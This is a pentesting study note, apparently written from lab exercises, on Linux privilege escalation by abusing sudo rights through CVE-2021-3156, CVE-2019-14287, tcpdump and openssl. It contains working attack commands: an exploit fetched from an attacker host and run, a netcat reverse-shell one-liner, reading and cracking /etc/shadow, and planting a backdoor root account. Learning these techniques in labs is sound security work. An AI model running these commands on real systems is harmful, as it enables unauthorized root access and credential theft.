---
title: Sudo Rights Abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Sudo Rights Abuse

When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. 

Therefore the  `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```
sudo -l
```


## Vulnerable sudo version

Find out the version of `sudo`:

```shell-session
sudo -V | head -n1
```

### CVE-2021-3156: hax-me-a-sandwich

This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

Proof of concept: [https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

In our attacking machine:

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

This will generate the file sudo-hax-me-a-sandwich. Now we serve this file from our attacking machine:

```
python3 -m http.server 80
```

From the target machine:

```
wget http://$IPAttackingMachine/sudo-hax-me-a-sandwich
chmod +x sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich
```

### CVE-2019-14287: Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. 

CVE-2019-14287: [https://www.sudo.ws/security/advisories/minus_1_uid/](https://www.sudo.ws/security/advisories/minus_1_uid/)

When sudo is configured to allow a user to run commands as an arbitrary user via the `ALL` keyword in a Runas specification, it is possible to run commands as root by specifying the user ID -1 or 4294967295.

Exploiting the bug requires that the user have sudo privileges that allow them to run commands with an arbitrary user ID.

```bash
sudo -l
```

Output:

```shell-session
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

This means that when we can run the command `/usr/bin/ncdu` as any user, except for the user root.

However, if we run it this way

```
sudo -u#-1 /bin/ncdu
```

The system may fallback to 0, which is the root user id:

```
root:x:0:0:root:/root:/bin/bash
```

After entering into `bin/ncdu` spawn a shell with several methods:

- Entering an exclamation mark: !
- With `/bin/bash -i`


## tcpdump

For instance:

```shell-session
sudo -l
```

Output:
 
```
Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. 

For example, an attacker could create the shell script `.test` containing a reverse shell:

```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPAttacker 1234 >/tmp/f
```

Then, we set a listener in the attacking machine:

```
nc -lvnp 1234
```

And then, run `tcpdump` as root with the `postrotate-command`.

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution.


## openssl

We continue our enumeration:

```
sudo -l
```

Output:

```
Matching Defaults entries for srvadm on dmz01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl

```

This means we can use openssl as root to do several things:
- Drop a cronjob or systemd service (if writable)
- Read root-only files
- Abuse 3: Read and execute your own reverse shell script

We can for instance, read /etc/shadows and of course /etc/password:

```
sudo openssl enc -in /etc/shadow -out /home/srvadm/shadow.copy -k x -pbkdf2
```

```
cat shadow.copy
```

If we copy /etc/shadows as shadow and /etc/password as password to our local machine:

**First**, save /etc/passwd and john /etc/shadow from the victim machine to the attacker machine.

**Second**, use unshadow to put users and passwords in the same file:

```bash
unshadow passwd shadow > crackme
# passwd: file saved with /etc/passwd content.
# shadow: file saved with /etc/shadow content.
```

**Third**, run johtheripper. You can use a list of users or specific ones brute force:

```bash
john -incremental -users:<userList> <fileToCrack>

# To display the passwords recovered:
john --show crackme

# Default path to cracked password: /root/.john/john.pot

# Dictionary attack
john -wordlist=<file> -users=victim1,victim2 -rules <filetocrack>
# -rules parameter adds som mangling to the wordlist
```

Now we will have 
```
letmein          (pixel)     
Welcome1         (tom)     
```

But we are mostly interested in root and lab_adm as they are administrators in the machine. So we will keep looking for a way. We may try to abuse openssl to write a new user in the system:

In our kali machine:

```
# create has for password password123
openssl passwd -6 password123
```

Output:

```
$6$7aLuG8NWQCqewCyI$5ZRTVbQqx096h7u9CzIEGzz2y6DMNYn4MF2P/BodZMWvFANlb3pW2X3vtotLCETO/qh1OBqqOIWqlYooyoQ/8.
```

In `/etc/passwd` line: 

```
r00tme:x:0:0:root:/root:/bin/bash
```

`/etc/shadow` line (replace `<HASH>`):

```
r00tme:<HASH>:19474:0:99999:7:::

# Meaning:
r00tme:$6$7aLuG8NWQCqewCyI$5ZRTVbQqx096h7u9CzIEGzz2y6DMNYn4MF2P/BodZMWvFANlb3pW2X3vtotLCETO/qh1OBqqOIWqlYooyoQ/8.:19474:0:99999:7:::
```

Bring the /etc/passwd and /etc/shadow to your kali:

Read /etc/shadows with our capabilities. Create a copy in the ubuntu target machine and after that copy the output to your kali (save it as sass):

```
sudo openssl enc -in /etc/shadow -out /home/srvadm/shadow.copy -k x -pbkdf2
cat shadow.copy
```

Do the same with /etc/passwd and save it as lass.

Now in your kali append the following to the /etc/passwd (lass) :

```
echo 'r00tme:x:0:0:root:/root:/bin/bash' >> lass
```

And append this line to the /etc/shadow (sass) file

```
echo 'r00tme:$6$7aLuG8NWQCqewCyI$5ZRTVbQqx096h7u9CzIEGzz2y6DMNYn4MF2P/BodZMWvFANlb3pW2X3vtotLCETO/qh1OBqqOIWqlYooyoQ/8.:19474:0:99999:7:::' >> sass
```

Now serve these lass and sass from your kali:

```
python -m http.server 8000
```

And download them from the ubuntu machine:

```
wget http://10.10.14.135:8000/lass
wget http://10.10.14.135:8000/sass
```

Now we will use the openssl running as sudo to overwrite /etc/passwd and /etc/shadow with our files, and therefore, create a new user with root capabilities.

```
sudo openssl enc -in lass -out /etc/passwd -k x -pbkdf2 -nopad

sudo openssl enc -in sass -out /etc/shadow -k x -pbkdf2 -nopad
```

Now:

```
cat flag.txt
```


Another way more straightforward: there is a [GTFOBin](https://gtfobins.github.io/gtfobins/openssl/) for the OpenSSL binary.

```
sudo -l

LFILE=file_to_read

openssl enc -in "$LFILE"
```

Copy the private key to your kali ~/.ssh folder:

```
chmod 600 dmz01_key
ssh -i dmz01_key root@10.129.203.111
```

